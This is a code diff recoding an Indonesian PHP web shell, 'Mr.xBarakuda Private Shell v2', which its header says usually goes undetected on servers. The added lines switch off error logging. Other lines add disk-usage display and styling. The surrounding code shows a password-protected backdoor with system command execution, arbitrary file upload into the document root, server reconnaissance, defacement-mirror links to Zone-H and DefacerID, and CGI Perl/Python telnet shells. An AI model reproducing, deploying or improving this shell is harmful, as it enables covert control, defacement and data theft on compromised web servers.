@@ -1,12 +1,19 @@
 <?php
 #####################################################################
 ##              Title : Mr.xBarakuda Private Shell v2              ##
-##              Fitur : Biasanya undetect pada server              ##
+##         Kelebihan  Fitur : Biasanya undetect pada server        ##
 ##   Thanks buat yang udah buat shell ini , kami hanya recode saja ##
 #####################################################################
 session_start();
 set_time_limit(0);
 error_reporting(0);
+@set_magic_quotes_runtime(0);
+@clearstatcache();
+@ini_set('error_log',NULL);
+@ini_set('log_errors',0);
+@ini_set('max_execution_time',0);
+@ini_set('output_buffering',0);
+@ini_set('display_errors', 0);
 date_default_timezone_set("Asia/Jakarta");
 $auth_pass = "3daf710b909636d4a1c2a606b79842e7";
 if(get_magic_quotes_gpc()) { 	
@@ -16,7 +23,7 @@ $_POST = VEstripslashes($_POST);
 $_COOKIE = VEstripslashes($_COOKIE); } 
 
 
-function Login() {
+function login_shell() {
 	die("
 <html>
 <head>
@@ -50,7 +57,7 @@ input[type=password] {
 <img src='https://1.bp.blogspot.com/-4tOJ4k2vcY4/WclSsGeuDNI/AAAAAAAAACM/wgxIWSXOqLsJtdgeY9SiCXt8uao6YPGUgCLcBGAs/s320/21740626_2180662082160348_5023158995146835701_n.png' width='334' height='334' align='center'>
 <br>
 <br>
-<pre align=center><form method='post'><input type='password' name='pass' style='background-color:none;border:1px solid #FFF;outline:none;' required><input type=submit value='Masuk njeng' style='border:none;background-color:#56AD15;color:#fff;cursor:pointer;'></form></pre>
+<pre align=center><form method='post'><input type='password' name='pass' style='background-color:none;border:1px solid #FFF;outline:none;' required><input type=submit value='Masuk Coeg!' style='border:none;background-color:#56AD15;color:#fff;cursor:pointer;'></form></pre>
 ");
 }
 
@@ -81,9 +88,12 @@ if(!empty($auth_pass)) {
  	font-family: Electrolize, sans-serif;
 }
  	body { 
+    background-image: url(" https://pa1.narvii.com/6132/f0a36c542be02d8455e369a724cb85e021438140_hq.gif ");
     background-color: black;
-    background-size: 100%;
+    background-size: 100% 100%;
     background-repeat:no-repeat;
+    background-attachment: fixed;
+    background-position: center;
     margin: 0px;
  	font-family: "Electrolize", sans-serif; cursive;color:#fff;
  	font-size: 13px;
@@ -216,7 +226,9 @@ a.nav-fokus:hover {color:#FFFFFF; background:#191919; border-top:0px; border-lef
 }
 </style>
 </head>
-
+<BODY>
+<H1><center><font color='red' face='courier new'>Mr.xBarakuda Private Shell</font></center></H1><br><a href='https://instagram.com/x_barakuda'><center><img src="https://1.bp.blogspot.com/-4tOJ4k2vcY4/WclSsGeuDNI/AAAAAAAAACM/wgxIWSXOqLsJtdgeY9SiCXt8uao6YPGUgCLcBGAs/s320/21740626_2180662082160348_5023158995146835701_n.png" width="25%" height="17%"></center></a>
+<br>
 <?php
 function w($dir,$perm) {
 	if(!is_writable($dir)) {
@@ -224,6 +236,16 @@ function w($dir,$perm) {
 	} else {
 		return "<font color=green>".$perm."</font>";
 	}
+}
+function hdd($s) {
+	if($s >= 1073741824)
+	return sprintf('%1.2f',$s / 1073741824 ).' GB';
+	elseif($s >= 1048576)
+	return sprintf('%1.2f',$s / 1048576 ) .' MB';
+	elseif($s >= 1024)
+	return sprintf('%1.2f',$s / 1024 ) .' KB';
+	else
+	return $s .' B';	
 }
 function exe($cmd) {
 	if(function_exists('system')) { 		
@@ -289,9 +311,9 @@ function GrabUrl($url,$type){
         curl_close($ch);
 
         foreach($urlArray as $value){
-            $lol="$url$value";
-			if(preg_match("#$type#is", $lol)) {
-				echo "$lol\r\n";
+            $kuda="$url$value";
+			if(preg_match("#$type#is", $kuda)) {
+				echo "$kuda\r\n";
 			}
         }
 }
@@ -360,14 +382,17 @@ return $info;
 }
 $sys = php_uname();
 $ip = gethostbyname($_SERVER['HTTP_HOST']);
-$sm = (@ini_get(strtolower("safe_mode")) == 'on') ? '<font>ON</font>' : '<font>OFF</font>';
+$freespace = hdd(disk_free_space("/"));
+$total = hdd(disk_total_space("/"));
+$used = $total - $freespace;
+$sm = (@ini_get(strtolower("safe_mode")) == 'on') ? '<font color=lime>ON</font>' : '<font color=red>OFF</font>';
 $getds = @ini_get("disable_functions");
 $ds = showdisablefunctions().' <font color=white>on</font> <font color=teal>'.php_sapi_name().'</font>';
-$mysql = (function_exists('mysql_connect')) ? "<font color=#6fcb9f>ON</font>" : "<font color=#b3eeff>OFF</font>";
-$curl = (function_exists('curl_version')) ? "<font color=#6fcb9f>ON</font>" : "<font color=#b3eeff>OFF</font>";
-$wget = (exe('wget --help')) ? "<font color=#6fcb9f>ON</font>" : "<font color=#b3eeff>OFF</font>";
-$perl = (exe('perl --help')) ? "<font color=#6fcb9f>ON</font>" : "<font color=#b3eeff>OFF</font>";
-$python = (exe('python --help')) ? "<font color=#6fcb9f>ON</font>" : "<font color=#b3eeff>OFF</font>";
+$mysql = (function_exists('mysql_connect')) ? "<font color=lime>ON</font>" : "<font color=red>OFF</font>";
+$curl = (function_exists('curl_version')) ? "<font color=lime>ON</font>" : "<font color=red>OFF</font>";
+$wget = (exe('wget --help')) ? "<font color=lime>ON</font>" : "<font color=red>OFF</font>";
+$perl = (exe('perl --help')) ? "<font color=lime>ON</font>" : "<font color=red>OFF</font>";
+$python = (exe('python --help')) ? "<font color=lime>ON</font>" : "<font color=red>OFF</font>";
 if(isset($_GET['path'])){
 $path = $_GET['path'];
 }else{
@@ -384,16 +409,16 @@ $_POST[$key] = stripslashes($value);
 }
 if($_POST['upload']) {
 		if($_POST['tipe_upload'] == 'biasa') {
-			if(@copy($_FILES['ix_file']['tmp_name'], "$path/".$_FILES['ix_file']['name']."")) {
-				$act = "<font color=green>Uploaded!</font> at <i><b>$path/".$_FILES['ix_file']['name']."</b></i>";
+			if(@copy($_FILES['kuda_file']['tmp_name'], "$path/".$_FILES['kuda_file']['name']."")) {
+				$act = "<font color=green>Uploaded!</font> at <i><b>$path/".$_FILES['kuda_file']['name']."</b></i>";
 			} else {
 				$act = "<font color=red>Failed to upload file</font>";
 			}
 		} else {
-			$root = $_SERVER['DOCUMENT_ROOT']."/".$_FILES['ix_file']['name'];
-			$web = $_SERVER['HTTP_HOST']."/".$_FILES['ix_file']['name'];
+			$root = $_SERVER['DOCUMENT_ROOT']."/".$_FILES['kuda_file']['name'];
+			$web = $_SERVER['HTTP_HOST']."/".$_FILES['kuda_file']['name'];
 			if(is_writable($_SERVER['DOCUMENT_ROOT'])) {
-				if(@copy($_FILES['ix_file']['tmp_name'], $root)) {
+				if(@copy($_FILES['kuda_file']['tmp_name'], $root)) {
 					$act = "<font color=green>Uploaded!</font> at <i><b>$root -> </b></i><a href='http://$web' target='_blank'>$web</a>";
 				} else {
 					$act = "<font color=red>Failed to upload file</font>";
@@ -407,16 +432,17 @@ if($_POST['upload']) {
 	<form method='post' enctype='multipart/form-data'>
 	<input type='radio' name='tipe_upload' value='biasa' checked>Biasa [ ".w($path,"Writeable")." ] 
 	<input type='radio' name='tipe_upload' value='home_root'>home_root [ ".w($_SERVER['DOCUMENT_ROOT'],"Writeable")." ]<br>
-	<input type='file' name='ix_file'>
+	<input type='file' name='kuda_file'>
 	<input type='submit' value='upload' name='upload'>
 	</form></center>";
 	echo "<center>".$act."</center>";
 echo"
-System : <font color=#b3eeff>".php_uname()."</font><br>
-Server IP : <font color=#b3eeff>".gethostbyname($_SERVER["HTTP_HOST"])."</font> | Your IP : <font color=#b3eeff>".$_SERVER["REMOTE_ADDR"]."</font><br>
-Safe Mode : <font color=#b3eeff>".$sm."</font><br>
-Time On Server : <font color=#b3eeff>".date("d M Y h:i:s a")."</font><br>
-Disable Functions : <font color=#b3eeff>".$ds."</font><br>
+System : <font color=cyan>".php_uname()."</font><br>
+Server IP : <font color=lime>".gethostbyname($_SERVER["HTTP_HOST"])."</font> | Your IP : <font color=red>".$_SERVER["REMOTE_ADDR"]."</font><br>
+Hard Disk Drive : <font color=red>$used</font> / <font color=cyan>$total</font> ( Free : <font color=lime>$freespace</font> )<br>
+Safe Mode : <font color=lime>".$sm."</font><br>
+Time On Server : <font color=yellow>".date("d M Y h:i:s a")."</font><br>
+Disable Functions : <font color=lime>".$ds."</font><br>
 MySQL : ".$mysql." | Perl : ".$perl." | Python : ".$python." | WGET : ".$wget." | CURL : ".$curl."<br>
 Mirror : <a href='?path=$path&mirror=zoneh'>Zone-H</a> / <a href='?path=$path&mirror=defid'>DefacerID</a><br>
 Telnet : <a href='?path=$path&kuda=cgi'>CGI Perl</a> / <a href='?path=$path&kuda=cgi2'>CGI Perl 2</a> / <a href='?path=$path&kuda=cgipy'>CGI Python</a><br>
